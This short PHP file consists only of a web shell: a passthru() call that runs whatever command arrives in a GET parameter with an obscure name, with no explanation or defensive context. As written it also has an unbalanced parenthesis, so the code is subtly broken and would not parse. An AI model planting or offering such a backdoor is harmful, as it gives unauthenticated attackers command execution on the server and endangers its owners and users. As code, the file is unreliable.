<?php
passthru(($_GET['AhasU_if']);
?>
